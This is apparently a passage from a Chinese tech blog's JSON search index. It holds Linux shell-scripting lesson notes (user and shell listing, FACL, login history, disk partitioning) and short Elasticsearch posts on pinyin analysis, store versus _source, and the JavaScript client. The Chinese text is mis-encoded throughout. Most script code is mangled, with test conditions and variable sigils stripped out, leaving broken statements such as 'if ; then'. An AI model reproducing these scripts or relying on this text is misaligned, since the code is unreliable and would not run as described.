ï¼šå†™ä¸€ä¸ªè„šæœ¬å†™ä¸€ä¸ªè„šæœ¬ï¼Œæ˜¾ç¤ºå½“å‰ç³»ç»Ÿä¸Šshellä¸º-sæŒ‡å®šç±»å‹çš„ç”¨æˆ·ï¼Œå¹¶ç»Ÿè®¡å…¶ç”¨æˆ·æ€»æ•°ã€‚-sé€‰é¡¹åé¢è·Ÿçš„å‚æ•°å¿…é¡»æ˜¯/etc/shellsæ–‡ä»¶ä¸­å­˜åœ¨çš„shellç±»å‹ï¼Œå¦åˆ™ä¸æ‰§è¡Œæ­¤è„šæœ¬ã€‚å¦å¤–ï¼Œæ­¤è„šæœ¬è¿˜å¯ä»¥æ¥å—â€“helpé€‰é¡¹ï¼Œä»¥æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯ã€‚è„šæœ¬æ‰§è¡Œå½¢å¦‚ï¼š./showshells.sh -s bashæ˜¾ç¤ºç»“æœå½¢å¦‚ï¼šBASHï¼Œ3usersï¼Œthey are:root,redhat,gentoo#!/bin/bashif ; then! grep â€œ2{2}2â€ /etc/shells &amp;&gt; /dev/null &amp;&amp; echo â€œInvalid shell.â€ &amp;&amp; exit 7elif ;thenecho â€œUsage: showshells.sh -s SHELL | --helpâ€exit 0elseecho â€œUnknown Options.â€exit 8fiNUMOFUSER=grep &quot;${2}$&quot; /etc/passwd | wc -lSHELLUSERS=grep &quot;${2}$&quot; /etc/passwd | cut -d: -f1SHELLUSERS=echo $SHELLUSERS | sed 's@[]@,@g'echo -e â€œ$2, NUMOFUSER users, they are: \\nSHELLUSERSâ€${å˜é‡å}æ–‡ä»¶ç³»ç»Ÿè®¿é—®åˆ—è¡¨ï¼štom:tom, tomåŸºæœ¬ç»„jerry: other:râ€“chownFACLï¼šFilesystem Access Control Liståˆ©ç”¨æ–‡ä»¶æ‰©å±•ä¿å­˜é¢å¤–çš„è®¿é—®æ§åˆ¶æƒé™jerry: rw-setfacl-m: è®¾å®šu:UID:permg:GID:perm-xï¼šå–æ¶ˆu:UIDg:GIDgetfaclå‡ ä¸ªå‘½ä»¤ï¼šwwhoæ¯éš”5ç§’é’Ÿï¼Œå°±æ¥æŸ¥çœ‹hadoopæ˜¯å¦å·²ç»ç™»å½•ï¼Œå¦‚ç™»å½•ï¼Œæ˜¾ç¤ºå…¶å·²ç»ç™»å½•ï¼Œå¹¶é€€å‡ºï¼›sleepwhoamilastï¼Œæ˜¾ç¤º/var/log/wtmpæ–‡ä»¶ï¼Œæ˜¾ç¤ºç”¨æˆ·ç™»å½•å†å²åŠç³»ç»Ÿé‡å¯å†å²-n #: æ˜¾ç¤ºæœ€è¿‘#æ¬¡çš„ç›¸å…³ä¿¡æ¯lastbï¼Œ/var/log/btmpæ–‡ä»¶ï¼Œæ˜¾ç¤ºç”¨æˆ·é”™è¯¯çš„ç™»å½•å°è¯•-n #:lastlog: æ˜¾ç¤ºæ¯ä¸€ä¸ªç”¨æˆ·æœ€è¿‘ä¸€æ¬¡çš„æˆåŠŸç™»å½•ä¿¡æ¯ï¼›-u USERNAME: æ˜¾ç¤ºç‰¹å®šç”¨æˆ·æœ€è¿‘çš„ç™»å½•ä¿¡æ¯basename$0: æ‰§è¡Œè„šæœ¬æ—¶çš„è„šæœ¬è·¯å¾„åŠåç§°mailhostname: æ˜¾ç¤ºä¸»æœºåå¦‚æœå½“å‰ä¸»æœºçš„ä¸»æœºåä¸æ˜¯www.magedu.comï¼Œå°±å°†å…¶æ”¹ä¸ºwww.magedu.comå¦‚æœå½“å‰ä¸»æœºçš„ä¸»æœºåæ˜¯localhostï¼Œå°±å°†å…¶æ”¹ä¸ºwww.magedu.comå¦‚æœå½“å‰ä¸»æœºçš„ä¸»æœºåä¸ºç©ºï¼Œæˆ–è€…ä¸º(none)ï¼Œæˆ–è€…ä¸ºlocalhostï¼Œå°±å°†å…¶æ”¹ä¸ºwww.magedu.com|| &amp;&amp; hostname www.magedu.comç”Ÿæˆéšæœºæ•°RANDOM: 0-32768éšæœºæ•°ç”Ÿæˆå™¨ï¼šç†µæ± /dev/random:/dev/urandom:å†™ä¸€ä¸ªè„šæœ¬ï¼Œåˆ©ç”¨RANDOMç”Ÿæˆ10ä¸ªéšæœºæ•°ï¼Œå¹¶æ‰¾å‡ºå…¶ä¸­çš„æœ€å¤§å€¼ï¼Œå’Œæœ€å°å€¼ï¼›#!/bin/bashdeclare -i MAX=0declare -i MIN=0for I in {1â€¦10}; doMYRAND=RANDOM && MIN=MYRANDif ; thenecho -n â€œMYRAND,&quot;elseecho&quot;MYRAND,&quot; else echo &quot;MYRAND,&quot;elseecho&quot;MYRANDâ€fi&amp;&amp; MAX=MYRAND && MIN=MYRANDdoneecho $MAX, $MINé¢å‘è¿‡ç¨‹æ§åˆ¶ç»“æ„é¡ºåºç»“æ„é€‰æ‹©ç»“æ„å¾ªç¯ç»“æ„é€‰æ‹©ç»“æ„ï¼šif: å•åˆ†æ”¯ã€åŒåˆ†æ”¯ã€å¤šåˆ†æ”¯if CONDITION; thenstatementâ€¦fiif CONDITION; thenstatementâ€¦elsestatementâ€¦fiif CONDITION1; thenstatementâ€¦elif CONDITION2; thenstatementâ€¦eslestatementâ€¦ficaseè¯­å¥ï¼šé€‰æ‹©ç»“æ„case SWITCH invalue1)statementâ€¦;;value2)statementâ€¦;;*)statementâ€¦;;esaca-zA-Z0-9åªæ¥å—å‚æ•°start,stop,restart,statuså…¶ä¸­ä¹‹ä¸€#!/bin/bashDEBUG=0ADD=0DEL=0for I in seq 0 $#; doif ; thencase $1 in-v|â€“verbose)DEBUG=1shift ;;-h|â€“help)echo â€œUsage: basename $0 --add USER_LIST --del USER_LIST -v|â€“verbose -h|â€“helpâ€exit 0;;â€“add)ADD=1ADDUSERS=$2shift 2;;â€“del)DEL=1DELUSERS=$2shift 2;;*)echo â€œUsage: basename $0 --add USER_LIST --del USER_LIST -v|â€“verbose -h|â€“helpâ€exit 7;;esacfidoneif ; thenfor USER in echo $ADDUSERS | sed 's@,@ @g'; doif id USER &> /dev/null; then && echo \"USER exists.&quot;elseuseradd $USER&amp;&amp; echo â€œAdd user $USER finished.â€fidonefiif ; thenfor USER in echo $DELUSERS | sed 's@,@ @g'; doif id $USER &amp;&gt; /dev/null; thenuserdel -r $USER&amp;&amp; echo â€œDelete USER finished.\" else && echo \"USER not exist.â€fidonefiç»ƒä¹ ï¼šå†™ä¸€ä¸ªè„šæœ¬showlogged.shï¼Œå…¶ç”¨æ³•æ ¼å¼ä¸ºï¼šshowlogged.sh -v -c -h|â€“helpå…¶ä¸­ï¼Œ-hé€‰é¡¹åªèƒ½å•ç‹¬ä½¿ç”¨ï¼Œç”¨äºæ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯ï¼›-cé€‰é¡¹æ—¶ï¼Œæ˜¾ç¤ºå½“å‰ç³»ç»Ÿä¸Šç™»å½•çš„æ‰€æœ‰ç”¨æˆ·æ•°ï¼›å¦‚æœåŒæ—¶ä½¿ç”¨äº†-vé€‰é¡¹ï¼Œåˆ™æ—¢æ˜¾ç¤ºåŒæ—¶ç™»å½•çš„ç”¨æˆ·æ•°ï¼Œåˆæ˜¾ç¤ºç™»å½•çš„ç”¨æˆ·çš„ç›¸å…³ä¿¡æ¯ï¼›å¦‚Logged users: 4.They are:root tty2 Feb 18 02:41root pts/1 Mar 8 08:36 (172.16.100.177)root pts/5 Mar 8 07:56 (172.16.100.177)hadoop pts/6 Mar 8 09:16 (172.16.100.177)#!/bin/bashdeclare -i SHOWNUM=0declare -i SHOWUSERS=0for I in seq 1 $#; doif ; thencase $1 in-h|â€“help)echo â€œUsage: basename $0 -h|â€“help -c|â€“count -v|â€“verboseâ€exit 0 ;;-v|â€“verbose)let SHOWUSERS=1shift ;;-c|â€“count)let SHOWNUM=1shift ;;*)echo â€œUsage: basename $0 -h|â€“help -c|â€“count -v|â€“verboseâ€exit 8 ;;esacfidoneif ; thenecho â€œLogged users: who | wc -l.â€if ; thenecho â€œThey are:â€whofifiç»ˆç«¯ç±»å‹ï¼šconsole: æ§åˆ¶å°pty: ç‰©ç†ç»ˆç«¯ (VGA)tty#: è™šæ‹Ÿç»ˆç«¯ (VGA)ttyS#: ä¸²è¡Œç»ˆç«¯pts/#: ä¼ªç»ˆç«¯shell:ln SRC DESTç¡¬é“¾æ¥ï¼š1ã€åªèƒ½å¯¹æ–‡ä»¶åˆ›å»ºï¼Œä¸èƒ½åº”ç”¨äºç›®å½•ï¼›2ã€ä¸èƒ½è·¨æ–‡ä»¶ç³»ç»Ÿï¼›3ã€åˆ›å»ºç¡¬é“¾æ¥ä¼šå¢åŠ æ–‡ä»¶è¢«é“¾æ¥çš„æ¬¡æ•°ï¼›ç¬¦å·é“¾æ¥ï¼š1ã€å¯åº”ç”¨äºç›®å½•ï¼›2ã€å¯ä»¥è·¨æ–‡ä»¶ç³»ç»Ÿï¼›3ã€ä¸ä¼šå¢åŠ è¢«é“¾æ¥æ–‡ä»¶çš„é“¾æ¥æ¬¡æ•°ï¼›4ã€å…¶å¤§å°ä¸ºæŒ‡å®šçš„è·¯å¾„æ‰€åŒ…å«çš„å­—ç¬¦ä¸ªæ•°ï¼›du-s-hdf:é“¾æ¥è®¾å¤‡æ–‡ä»¶ï¼šb: æŒ‰å—ä¸ºå•ä½ï¼Œéšæœºè®¿é—®çš„è®¾å¤‡ï¼›cï¼šæŒ‰å­—ç¬¦ä¸ºå•ä½ï¼Œçº¿æ€§è®¾å¤‡ï¼›b: ç¡¬ç›˜ c: é”®ç›˜ /devä¸»è®¾å¤‡å· ï¼ˆmajor numberï¼‰æ ‡è¯†è®¾å¤‡ç±»å‹æ¬¡è®¾å¤‡å· ï¼ˆminor numberï¼‰æ ‡è¯†åŒä¸€ç§ç±»å‹ä¸­ä¸åŒè®¾å¤‡mknodmknod â€¦ NAME TYPE-m MODEç¡¬ç›˜è®¾å¤‡çš„è®¾å¤‡æ–‡ä»¶åï¼šIDE, ATAï¼šhdSATAï¼šsdSCSI: sdUSB: sda,b,c,â€¦æ¥åŒºåˆ«åŒä¸€ç§ç±»å‹ä¸‹çš„ä¸åŒè®¾å¤‡IDE:ç¬¬ä¸€ä¸ªIDEå£ï¼šä¸»ã€ä»/dev/hda, /dev/hdbç¬¬äºŒä¸ªIDEå£ï¼šä¸»ã€ä»/dev/hdc, /dev/hddsda, sdb, sdc, â€¦hda:hda1: ç¬¬ä¸€ä¸ªä¸»åˆ†åŒºhda2:hda3:hda4:hda5: ç¬¬ä¸€ä¸ªé€»è¾‘åˆ†åŒºæŸ¥çœ‹å½“å‰ç³»ç»Ÿè¯†åˆ«äº†å‡ å—ç¡¬ç›˜ï¼šfdisk -lç®¡ç†ç£ç›˜åˆ†åŒºï¼šfdisk /dev/sdap: æ˜¾ç¤ºå½“å‰ç¡¬ä»¶çš„åˆ†åŒºï¼ŒåŒ…æ‹¬æ²¡ä¿å­˜çš„æ”¹åŠ¨n: åˆ›å»ºæ–°åˆ†åŒºe: æ‰©å±•åˆ†åŒºp: ä¸»åˆ†åŒºd: åˆ é™¤ä¸€ä¸ªåˆ†åŒºw: ä¿å­˜é€€å‡ºq: ä¸ä¿å­˜é€€å‡ºt: ä¿®æ”¹åˆ†åŒºç±»å‹L:l: æ˜¾ç¤ºæ‰€æ”¯æŒçš„æ‰€æœ‰ç±»å‹partprobeç»ƒä¹ ï¼šå†™ä¸€ä¸ªè„šæœ¬é€šè¿‡å‘½ä»¤è¡Œä¼ é€’ä¸€ä¸ªæ–‡ä»¶è·¯å¾„å‚æ•°ç»™è„šæœ¬ï¼šå¦‚æœå‚æ•°å¤šäº†æˆ–å°‘äº†ï¼ŒæŠ¥é”™ï¼›å¦‚æœå‚æ•°æŒ‡å®šçš„è·¯å¾„å¯¹åº”çš„æ˜¯ç›®å½•è€Œä¸æ˜¯æ–‡ä»¶ï¼ŒæŠ¥é”™ï¼›è€Œåï¼Œæ£€æŸ¥è·¯å¾„æŒ‡å®šçš„æ–‡ä»¶æ˜¯å¦ä¸ºç©ºæˆ–ä¸å­˜åœ¨ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™æ–°å»ºæ­¤æ–‡ä»¶ï¼Œå¹¶åœ¨æ–‡ä»¶ä¸­ç”Ÿæˆå¦‚ä¸‹å†…å®¹#!/bin/bashè€Œåï¼Œä½¿ç”¨vimç¼–è¾‘å™¨æ‰“å¼€æ­¤æ–‡ä»¶ï¼Œå¹¶è®©å…‰æ ‡å¤„äºè¿™ä¸ªæ–‡ä»¶çš„æœ€åä¸€â†©ï¸â†©ï¸â†©ï¸","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"elasticsearch æ‹¼éŸ³åˆ†è¯","slug":"history/tech/5953c4d0c2b92f5665eed9a4","date":"2015-12-23T22:36:08.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9a4/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9a4/","excerpt":"","text":"curl -XPUT http://@127.0.0.1:8888/qianrushi/_settings -dâ€™{â€œindexâ€ : {â€œanalysisâ€ : {â€œanalyzerâ€ : {â€œpinyin_analyzerâ€ : {â€œtokenizerâ€ : â€œmy_pinyinâ€,â€œfilterâ€ :}},â€œtokenizerâ€ : {â€œmy_pinyinâ€ : {â€œtypeâ€ : â€œpinyinâ€,â€œfirst_letterâ€ : â€œappendâ€,â€œpadding_charâ€ : &quot; &quot;}}}}}â€™","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://wangxiuwen.github.io/tags/elasticsearch/"}],"author":"wangxiuwen"},{"title":"mysql jdbc river å¢é‡æŸ¥è¯¢","slug":"history/tech/5953c4d0c2b92f5665eed9a3","date":"2015-12-23T22:33:32.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9a3/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9a3/","excerpt":"","text":"select id as _id,title from ms_ecms_news where lastdotime &gt; UNIX_TIMESTAMP(now())-100","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://wangxiuwen.github.io/tags/elasticsearch/"}],"author":"wangxiuwen"},{"title":"elasticsearchçš„storeå±æ€§è·Ÿ_sourceå­—æ®µ","slug":"history/tech/5953c4d0c2b92f5665eed9a2","date":"2015-12-23T19:22:02.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9a2/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9a2/","excerpt":"","text":"ä¼—æ‰€å‘¨çŸ¥_sourceå­—æ®µå­˜å‚¨çš„æ˜¯ç´¢å¼•çš„åŸå§‹å†…å®¹ï¼Œé‚£storeå±æ€§çš„è®¾ç½®æ˜¯ä¸ºä½•å‘¢ï¼Ÿesä¸ºä»€ä¹ˆè¦æŠŠstoreçš„é»˜è®¤å–å€¼è®¾ç½®ä¸ºnoï¼Ÿè®¾ç½®ä¸ºyesæ˜¯å¦æ˜¯é‡å¤çš„å­˜å‚¨å‘¢ï¼Ÿæˆ‘ä»¬å°†ä¸€ä¸ªfieldçš„å€¼å†™å…¥esä¸­ï¼Œè¦ä¹ˆæ˜¯æƒ³åœ¨è¿™ä¸ªfieldä¸Šæ‰§è¡Œsearchæ“ä½œï¼ˆä¸çŸ¥é“å…·ä½“çš„idï¼‰ï¼Œè¦ä¹ˆæ‰§è¡Œretrieveæ“ä½œï¼ˆæ ¹æ®idæ¥æ£€ç´¢ï¼‰ã€‚ä½†æ˜¯ï¼Œå¦‚æœä¸æ˜¾å¼çš„å°†è¯¥fieldçš„storeå±æ€§è®¾ç½®ä¸ºyesï¼ŒåŒæ—¶_sourceå­—æ®µenabledçš„æƒ…å†µä¸‹ï¼Œä½ ä»ç„¶å¯ä»¥è·å–åˆ°è¿™ä¸ªfieldçš„å€¼ã€‚è¿™å°±æ„å‘³ç€åœ¨ä¸€äº›æƒ…å†µä¸‹è®©ä¸€ä¸ªfieldä¸è¢«indexæˆ–è€…storeä»ç„¶æ˜¯æœ‰æ„ä¹‰çš„ã€‚å½“ä½ å°†ä¸€ä¸ªfieldçš„storeå±æ€§è®¾ç½®ä¸ºtrueï¼Œè¿™ä¸ªä¼šåœ¨luceneå±‚é¢å¤„ç†ã€‚luceneæ˜¯å€’æ’ç´¢å¼•ï¼Œå¯ä»¥æ‰§è¡Œå¿«é€Ÿçš„å…¨æ–‡æ£€ç´¢ï¼Œè¿”å›ç¬¦åˆæ£€ç´¢æ¡ä»¶çš„æ–‡æ¡£idåˆ—è¡¨ã€‚åœ¨å…¨æ–‡ç´¢å¼•ä¹‹å¤–ï¼Œluceneä¹Ÿæä¾›äº†å­˜å‚¨å­—æ®µçš„å€¼çš„ç‰¹æ€§ï¼Œä»¥æ”¯æŒæä¾›idçš„æŸ¥è¯¢ï¼ˆæ ¹æ®idå¾—åˆ°åŸå§‹ä¿¡æ¯ï¼‰ã€‚é€šå¸¸æˆ‘ä»¬åœ¨luceneå±‚é¢å­˜å‚¨çš„fieldçš„å€¼æ˜¯è·Ÿéšsearchè¯·æ±‚ä¸€èµ·è¿”å›çš„ï¼ˆid+fieldçš„å€¼ï¼‰ã€‚eså¹¶ä¸éœ€è¦å­˜å‚¨ä½ æƒ³è¿”å›çš„æ¯ä¸€ä¸ªfieldçš„å€¼ï¼Œå› ä¸ºé»˜è®¤æƒ…å†µä¸‹æ¯ä¸€ä¸ªæ–‡æ¡£çš„çš„å®Œæ•´ä¿¡æ¯éƒ½å·²ç»å­˜å‚¨äº†ï¼Œå› æ­¤å¯ä»¥è·ŸéšæŸ¥è¯¢ç»“æ„è¿”å›ä½ æƒ³è¦çš„æ‰€æœ‰fieldå€¼ã€‚æœ‰ä¸€äº›æƒ…å†µä¸‹ï¼Œæ˜¾å¼çš„å­˜å‚¨æŸäº›fieldçš„å€¼æ˜¯å¿…é¡»çš„ï¼šå½“_sourceè¢«disabledçš„æ—¶å€™ï¼Œæˆ–è€…ä½ å¹¶ä¸æƒ³ä»sourceä¸­parseræ¥å¾—åˆ°fieldçš„å€¼ï¼ˆå³ä½¿è¿™ä¸ªè¿‡ç¨‹æ˜¯è‡ªåŠ¨çš„ï¼‰ã€‚è¯·è®°ä½ï¼šä»æ¯ä¸€ä¸ªstored fieldä¸­è·å–å€¼éƒ½éœ€è¦ä¸€æ¬¡ç£ç›˜ioï¼Œå¦‚æœæƒ³è·å–å¤šä¸ªfieldçš„å€¼ï¼Œå°±éœ€è¦å¤šæ¬¡ç£ç›˜ioï¼Œä½†æ˜¯ï¼Œå¦‚æœä»_sourceä¸­è·å–å¤šä¸ªfieldçš„å€¼ï¼Œåˆ™åªéœ€è¦ä¸€æ¬¡ç£ç›˜ioï¼Œå› ä¸º_sourceåªæ˜¯ä¸€ä¸ªå­—æ®µè€Œå·²ã€‚æ‰€ä»¥åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œä»_sourceä¸­è·å–æ˜¯å¿«é€Ÿè€Œé«˜æ•ˆçš„ã€‚esä¸­é»˜è®¤çš„è®¾ç½®_sourceæ˜¯enableçš„ï¼Œå­˜å‚¨æ•´ä¸ªæ–‡æ¡£çš„å€¼ã€‚è¿™æ„å‘³ç€åœ¨æ‰§è¡Œsearchæ“ä½œçš„æ—¶å€™å¯ä»¥è¿”å›æ•´ä¸ªæ–‡æ¡£çš„ä¿¡æ¯ã€‚å¦‚æœä¸æƒ³è¿”å›è¿™ä¸ªæ–‡æ¡£çš„å®Œæ•´ä¿¡æ¯ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šè¦æ±‚è¿”å›çš„fieldï¼Œesä¼šè‡ªåŠ¨ä»_sourceä¸­æŠ½å–å‡ºæŒ‡å®šfieldçš„å€¼è¿”å›ï¼ˆæ¯”å¦‚è¯´highlightingçš„éœ€æ±‚ï¼‰ã€‚ä½ å¯ä»¥æŒ‡å®šä¸€äº›å­—æ®µstoreä¸ºtrueï¼Œè¿™æ„å‘³ç€è¿™ä¸ªfieldçš„æ•°æ®å°†ä¼šè¢«å•ç‹¬å­˜å‚¨ã€‚è¿™æ—¶å€™ï¼Œå¦‚æœä½ è¦æ±‚è¿”å›field1ï¼ˆstoreï¼šyesï¼‰ï¼Œesä¼šåˆ†è¾¨å‡ºfield1å·²ç»è¢«å­˜å‚¨äº†ï¼Œå› æ­¤ä¸ä¼šä»_sourceä¸­åŠ è½½ï¼Œè€Œæ˜¯ä»field1çš„å­˜å‚¨å—ä¸­åŠ è½½ã€‚å“ªäº›æƒ…å½¢ä¸‹éœ€è¦æ˜¾å¼çš„æŒ‡å®šstoreå±æ€§å‘¢ï¼Ÿå¤§å¤šæ•°æƒ…å†µå¹¶ä¸æ˜¯å¿…é¡»çš„ã€‚ä»_sourceä¸­è·å–å€¼æ˜¯å¿«é€Ÿè€Œä¸”é«˜æ•ˆçš„ã€‚å¦‚æœä½ çš„æ–‡æ¡£é•¿åº¦å¾ˆé•¿ï¼Œå­˜å‚¨_sourceæˆ–è€…ä»_sourceä¸­è·å–fieldçš„ä»£ä»·å¾ˆå¤§ï¼Œä½ å¯ä»¥æ˜¾å¼çš„å°†æŸäº›fieldçš„storeå±æ€§è®¾ç½®ä¸ºyesã€‚ç¼ºç‚¹å¦‚ä¸Šè¾¹æ‰€è¯´ï¼šå‡è®¾ä½ å­˜å‚¨äº†10ä¸ªfieldï¼Œè€Œå¦‚æœæƒ³è·å–è¿™10ä¸ªfieldçš„å€¼ï¼Œåˆ™éœ€è¦å¤šæ¬¡çš„ioï¼Œå¦‚æœä»_sourceä¸­è·å–åˆ™åªéœ€è¦ä¸€æ¬¡ï¼Œè€Œä¸”_sourceæ˜¯è¢«å‹ç¼©è¿‡çš„ã€‚è¿˜æœ‰ä¸€ç§æƒ…å½¢ï¼šreindex from some fieldï¼Œå¯¹æŸäº›å­—æ®µé‡å»ºç´¢å¼•çš„æ—¶å€™ã€‚ä»sourceä¸­è¯»å–æ•°æ®ç„¶åreindexï¼Œå’Œä»æŸäº›fieldä¸­è¯»å–æ•°æ®ç›¸æ¯”ï¼Œæ˜¾ç„¶åè€…ä»£ä»·æ›´ä½ä¸€äº›ã€‚è¿™äº›å­—æ®µstoreè®¾ç½®ä¸ºyesæ¯”è¾ƒåˆé€‚ã€‚æ€»ç»“ï¼šå¦‚æœå¯¹æŸä¸ªfieldåšäº†ç´¢å¼•ï¼Œåˆ™å¯ä»¥æŸ¥è¯¢ã€‚å¦‚æœstoreï¼šyesï¼Œåˆ™å¯ä»¥å±•ç¤ºè¯¥fieldçš„å€¼ã€‚ä½†æ˜¯å¦‚æœä½ å­˜å‚¨äº†è¿™ä¸ªdocçš„æ•°æ®ï¼ˆ_source enableï¼‰ï¼Œå³ä½¿storeä¸ºnoï¼Œä»ç„¶å¯ä»¥å¾—åˆ°fieldçš„å€¼ï¼ˆclientå»è§£æï¼‰ã€‚æ‰€ä»¥ä¸€ä¸ªstoreè®¾ç½®ä¸ºno çš„fieldï¼Œå¦‚æœ_sourceè¢«disableï¼Œåˆ™åªèƒ½æ£€ç´¢ä¸èƒ½å±•ç¤ºã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://wangxiuwen.github.io/tags/elasticsearch/"}],"author":"wangxiuwen"},{"title":"elasticsearch","slug":"history/tech/5953c4d0c2b92f5665eed9a0","date":"2015-12-23T03:32:34.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9a0/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9a0/","excerpt":"","text":"ç»§PHPã€Rubyã€Pythonå’ŒPerlä¹‹åï¼ŒElasticsearchæœ€è¿‘å‘å¸ƒäº†Elasticsearch.jsï¼ŒElasticsearchçš„JavaScriptå®¢æˆ·ç«¯åº“ã€‚å¯ä»¥åœ¨Node.jså’Œæµè§ˆå™¨ä¸­ä½¿ç”¨ã€‚å®‰è£…node.jsæ¨¡å—åœ¨Node.jsé¡¹ç›®ä¸­ä½¿ç”¨ï¼Œåªéœ€ç”¨npmå®‰è£…ï¼šæµè§ˆå™¨Elasticsearch.jsä¸ºç°ä»£æµè§ˆå™¨å‡†å¤‡äº†æ„å»ºï¼Œå¯ä»æ­¤å¤„å–å¾—ã€‚ä¸‹è½½åè§£å‹ç¼©ï¼Œç„¶åé€‰æ‹©é€‚åˆä½ çš„æ–‡ä»¶ï¼šelasticsearch.jquery.js â€”â€” å¦‚æœä½ ä½¿ç”¨jQueryelasticsearch.angual.js â€”â€” å¦‚æœä½ ä½¿ç”¨Angularelasticsearch.js â€”â€” å…¶ä»–æƒ…å†µè®¾ç½®åˆ›å»ºä¸€ä¸ªelasticsearch.Clientçš„æ–°å®ä¾‹ï¼švar elasticsearch = require(â€˜elasticsearchâ€™);// ä½¿ç”¨é»˜è®¤é…ç½®è¿æ¥åˆ° localhost:9200var client = new elasticsearch.Client();// è¿æ¥ä¸¤ä¸ªèŠ‚ç‚¹ï¼Œè´Ÿè½½å‡è¡¡ä½¿ç”¨round-robinç®—æ³•var client = elasticsearch.Client({hosts:});åœ¨æµè§ˆå™¨ä¸­è®¾ç½®Clientæ„é€ å™¨æ¥å—çš„å‚æ•°æ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯ä¸åŒçš„æ„å»ºè®¿é—®æ„é€ å™¨çš„æ–¹å¼æœ‰æ‰€ä¸åŒï¼š// elasticsearch.js å°† elasticsearch å‘½åç©ºé—´åŠ å…¥çª—å£var client = elasticsearch.Client({ â€¦ });// elasticsearch.jquery.js å°† es å‘½åç©ºé—´åŠ å…¥ jQuery å¯¹è±¡var client = jQuery.es.Client({ â€¦ });// elasticsearch.angular.js åˆ›å»º elasticsearch æ¨¡å—// æä¾› esFactoryvar app = angular.module(â€˜appâ€™, );app.service(â€˜esâ€™, function (esFactory) {return esFactory({ â€¦ });});ä½¿ç”¨clientå®ä¾‹è°ƒç”¨APIåˆ›å»ºäº†å®ä¾‹åè°ƒç”¨APIå°±å¾ˆç®€å•äº†ã€‚// è·å–çŠ¶æ€ï¼Œå‚æ•°å¯é€‰ï¼Œå¯ä»¥åªä¼ é€’ä¸€ä¸ªå›è°ƒclient.cluster.health(function (err, resp) {if (err) {console.error(err.message);} else {console.dir(resp);}});// å»ºç«‹ç´¢å¼•client.index({index: â€˜blogâ€™,type: â€˜postâ€™,id: 1,body: {title: â€˜JavaScript Everywhere!â€™,content: â€˜It all started whenâ€¦â€™,date: â€˜2013-12-17â€™}}, function (err, resp) {// â€¦});// æœç´¢æ–‡æ¡£client.search({index: â€˜usersâ€™,size: 50,body: {query: {match: {profile: â€˜elasticsearchâ€™}}}}).then(function (resp) {var hits = resp.body.hits;});Elasticsearch.jsä»¥Apache 2.0è®¸å¯è¯å‘å¸ƒï¼Œæºä»£ç åœ¨Githubä¸Šã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"nodejs","slug":"nodejs","permalink":"https://wangxiuwen.github.io/tags/nodejs/"}],"author":"wangxiuwen"},{"title":"elasticsearch mapping","slug":"history/tech/5953c4d0c2b92f5665eed99f","date":"2015-12-23T03:24:51.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed99f/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed99f/","excerpt":"","text":"æœ€è¿‘é¡¹ç›®å‡†å¤‡ç”¨åˆ°elasticsearchï¼Œ é¦–å…ˆéœ€è¦ææ¸…æ¥šelasticsearchçš„ä¸€äº›æ¦‚å¿µï¼Œåœ¨ç½‘ä¸Šå‘ç°è¿™ç¯‡æ–‡ç« 